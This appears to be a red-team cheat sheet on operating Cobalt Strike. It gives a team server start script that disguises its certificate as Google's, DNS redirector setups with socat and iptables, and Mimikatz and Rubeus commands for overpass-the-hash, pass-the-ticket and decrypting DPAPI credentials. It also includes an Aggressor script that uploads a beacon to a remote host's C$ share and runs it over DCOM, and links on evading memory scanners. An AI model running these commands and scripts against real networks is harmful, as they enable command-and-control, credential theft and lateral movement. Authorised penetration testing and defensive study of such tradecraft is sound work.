# Cobalt Strike

- [https://reconshell.com/list-of-awesome-cobaltstrike-resources/](https://reconshell.com/list-of-awesome-cobaltstrike-resources/)
- [https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet](https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet)

Run as a daemon:

{% tabs %}
{% tab title="Service Unit" %}
{% code title="/etc/systemd/system/cobaltstrike.service" %}
```
[Unit]
Description=CobaltStrike
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=on-failure
RestartSec=3
User=root
ExecStart=/opt/CobaltStrike/start.sh

[Install]
WantedBy=multi-user.target
```
{% endcode %}
{% endtab %}
{% tab title="Start Script" %}
{% code title="/opt/CobaltStrike/start.sh" %}
```bash
#!/bin/bash

CS_IP=`hostname -I | awk '{print $1}'`
CS_PASS='Passw0rd1!'
CS_PATH='/opt/CobaltStrike'

rm -{f} "${CS_PATH}/Profiles/random_c2_profile/output/*.profile"
CS_PROFILE=`cd "${CS_PATH}/Profiles/random_c2_profile"; python3 ./random_c2profile.py | tail -1 | awk -F/ '{print $2}'`

if [ ! -f "${CS_PATH}/cobaltstrike.store" ]; then
        /usr/bin/keytool -keystore ./cobaltstrike.store -storepass 'Passw0rd2!' -keypass 'Passw0rd2!' -genkey -keyalg RSA -alias cobaltstrike -dname 'CN=google.com, O=Google Inc, L=Mountain View, ST=California, C=US'
fi

${CS_PATH}/TeamServerImage -Dcobaltstrike.server_port=1337 -Dcobaltstrike.server_bindto="${CS_IP}" -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword='Passw0rd2!' teamserver "${CS_IP}" "${CS_PASS}" "${CS_PATH}/Profiles/random_c2_profile/output/${CS_PROFILE}"
```
{% endtab %}
{% endtab %}
{% endtabs %}




## Malleable C2 Profiles

- [https://blog.zsec.uk/cobalt-strike-profiles/](https://blog.zsec.uk/cobalt-strike-profiles/)
- [https://github.com/rsmudge/Malleable-C2-Profiles](https://github.com/rsmudge/Malleable-C2-Profiles)



### SourcePoint

- [https://github.com/Tylous/SourcePoint](https://github.com/Tylous/SourcePoint)

```
$ ./SourcePoint -Host 10.10.13.37 -Injector NtMapViewOfSection [-Sleep 10 -Jitter 0] -Outfile test.profile
```




## Aggressor Scripts

- [https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/agressor_script.htm](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/agressor_script.htm)
- [https://chowdera.com/2021/02/20210204190220156W.html](https://chowdera.com/2021/02/20210204190220156W.html)
- [https://www.kingstonesecurity.com/blog/efficiency-with-aggressor](https://www.kingstonesecurity.com/blog/efficiency-with-aggressor)




## Community Kit

- [https://cobalt-strike.github.io/community_kit/](https://cobalt-strike.github.io/community_kit/)




## P2P Beacons

Beacon TCP and Beacon SMB are Peer-to-Peer beacons which means they're used to chain a connection to an existent beacon. They act like bind shells and waits for the attacker to connect to them.

Connect to a TCP beacon:

```
beacon> connect <IP> <PORT>
```

Connect to an SMB beacon:

```
beacon> link <IP>
```




## DNS Beacons

- [https://www.cobaltstrike.com/blog/simple-dns-redirectors-for-cobalt-strike/](https://www.cobaltstrike.com/blog/simple-dns-redirectors-for-cobalt-strike/)

Create an `A` record `ns66.example.com` pointing to IP address of the redirector and then an `NS` record pointing to `ns66.example.com`.

{% hint style="warning" %}
Before starting a DNS listener, the localhost resolver should be shut down if necessary: `sudo systemctl disable systemd-resolved --now`.
{% endhint %}



### socat Redirector

On the redirector:

```
$ sudo socat -T 1 udp4-listen:53,fork tcp4:<TEAMSERVER_IP>:5353
```

On the team server:

```
$ socat -T 10 tcp4-listen:5353,fork udp4:127.0.0.1:53
```

### iptables Redirector

{% tabs %}
{% tab title="Add" %}
{% code title="dns-forwarder-on.sh" %}
```bash
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
sudo iptables -I INPUT -p udp -m udp --dport 53 -j ACCEPT
sudo iptables -t nat -A PREROUTING -m state --state NEW --protocol udp --destination <REDIRECTOR_IP> --destination-port 53 -j MARK --set-mark 0x400
sudo iptables -t nat -A PREROUTING -m mark --mark 0x400 --protocol udp -j DNAT --to-destination <TEAMSERVER_IP>:53
sudo iptables -t nat -A POSTROUTING -m mark --mark 0x400 -j MASQUERADE
sudo iptables -I FORWARD -j ACCEPT
```
{% endcode %}
{% endtab %}
{% tab title="Delete" %}
{% code title="dns-forwarder-off.sh" %}
```bash
sudo sh -c 'echo 0 > /proc/sys/net/ipv4/ip_forward'
sudo iptables -D INPUT -p udp -m udp --dport 53 -j ACCEPT
sudo iptables -t nat -D PREROUTING -m state --state NEW --protocol udp --destination <REDIRECTOR_IP> --destination-port 53 -j MARK --set-mark 0x400
sudo iptables -t nat -D PREROUTING -m mark --mark 0x400 --protocol udp -j DNAT --to-destination <TEAMSERVER_IP>:53
sudo iptables -t nat -D POSTROUTING -m mark --mark 0x400 -j MASQUERADE
sudo iptables -D FORWARD -j ACCEPT
```
{% endcode %}
{% endtab %}
{% endtabs %}



### DNSMasq Redirector

- [https://buaq.net/go-20984.html](https://buaq.net/go-20984.html)




## Overpass-the-Hash

More opsec PtH than builtin `pth` command (which does the Mimikatz `sekurlsa::pth` thing with named pipe impersonation):

```
beacon> mimikatz sekurlsa::pth /user:snovvcrash /domain:megacorp.local /ntlm:fc525c9683e8fe067095ba2ddc971889
beacon> steal_token 1337
```

Same with Rubeus (must be in elevated context):

```
beacon> execute-assembly Rubeus.exe asktgt /user:snovvcrash /domain:megacorp.local /aes256:94b4d075fd15ba856b4b7f6a13f76133f5f5ffc280685518cad6f732302ce9ac /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
beacon> steal_token 1337
```

Use Rubeus with lower privileges:

```
beacon> execute-assembly Rubeus.exe asktgt /user:snovvcrash /domain:megacorp.local /aes256:94b4d075fd15ba856b4b7f6a13f76133f5f5ffc280685518cad6f732302ce9ac /nowrap /opsec

PS > [System.IO.File]::WriteAllBytes("C:\Windows\Tasks\tgt.kirbi", [System.Convert]::FromBase64String("<BASE64_TICKET>"))
Or
$ echo -en "<BASE64_TICKET>" | base64 -d > tgt.kirbi

beacon> run klist
Or
beacon> execute-assembly Rubeus.exe klist

beacon> make_token MEGACORP\snovvcrash dummy_Passw0rd!
beacon> kerberos_ticket_use C:\Windows\Tasks\tgt.kirbi
```




## Pass-the-Ticket

Create a sacrificial process, import the TGT into its logon session and steal its security token:

```
beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
beacon> execute-assembly Rubeus.exe ptt /luid:0x1337 /ticket:<BASE64_TICKET>
beacon> beacon> steal_token 1337
```




## Pivoting

Make any traffic hitting port **8443** on Victim to be redirected to **10.10.13.37** on port **443** (traffic flows through the team server):

```
beacon> rportfwd 8443 10.10.13.37 443
```

Make any traffic hitting port **8080** on Victim to be redirected to **localhost:80** on Attacker (traffic flows through the CS client):

```
beacon> rportfwd_local 8080 127.0.0.1 80
```

Extending `jump` with [Invoke-DCOM.ps1](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/lateral_movement/Invoke-DCOM.ps1):

```powershell
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command1
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");

    # read in the script
    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
    $script = readb($handle, -1);
    closef($handle);

    # host the script in Beacon
    $oneliner = beacon_host_script($1, $script);

    # generate stageless payload
    $payload = artifact_payload($3, "exe", "x64");

    # upload to the target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);

    # run via this powerpick
    bpowerpick!($1, "Invoke-DCOM -ComputerName $+ $2 $+ -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

    # link if p2p beacon
    beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

Forward SOCKS server's port from team server to the client:

```
beacon> socks 1080
$ ssh -tt -v -L 9050:localhost:1080 root@teamserver
```




## Credentials



### DPAPI

List credential blobs:

```
beacon> ls C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials
```

List vault credentials:

```
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
beacon> mimikatz vault::list
```

Check which master keys correspond to credential blobs (look for **guidMasterKey** field with GUID):

```
beacon> mimikatz dpapi::cred /in:C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\<BLOB>
```

The master key is stored here:

```
beacon> ls C:\Users\snovvcrash\AppData\Roaming\Microsoft\Protect\<SID>
```

Decrypt the master key via RPC on the Domain Controller and show it:

```
beacon> mimikatz dpapi::masterkey /in:C:\Users\snovvcrash\AppData\Roaming\Microsoft\Protect\<SID> /rpc
```

Decrypt the blob with decrypted master key:

```
beacon> mimikatz dpapi::cred /in:C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\<BLOB> /masterkey:<MASTERKEY>
```




## Evasion

- [[PDF] Avoiding Memory Scanners (Kyle Avery, @kyleavery)](https://www.blackhillsinfosec.com/avoiding-memory-scanners/)
- [https://github.com/kyleavery/AceLdr](https://github.com/kyleavery/AceLdr)

{% embed url="https://youtu.be/edIMUcxCueA" %}



### Sleep Mask

{% content-ref url="/redteam/maldev/code-injection/README.md#shellcode-in-memory-fluctuation-obfuscate-and-sleep" %}
[README.md](README.md)
{% endcontent-ref %}

- [https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures](https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures)
- [https://adamsvoboda.net/sleeping-with-a-mask-on-cobaltstrike/](https://adamsvoboda.net/sleeping-with-a-mask-on-cobaltstrike/)




## Detection

- [https://github.com/chronicle/GCTI](https://github.com/chronicle/GCTI)
